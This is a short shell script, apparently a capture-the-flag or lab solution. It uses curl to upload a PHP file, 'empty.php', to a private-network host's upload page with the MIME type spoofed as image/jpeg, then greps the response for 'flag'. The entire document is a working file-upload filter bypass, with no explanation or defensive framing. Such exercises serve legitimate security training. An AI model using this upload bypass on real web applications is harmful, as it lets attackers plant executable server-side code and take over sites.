#!/bin/sh

curl -X POST -F 'Upload=Upload' -F 'uploaded=@empty.php;type=image/jpeg' "http://192.168.42.238/?page=upload#" | grep "flag"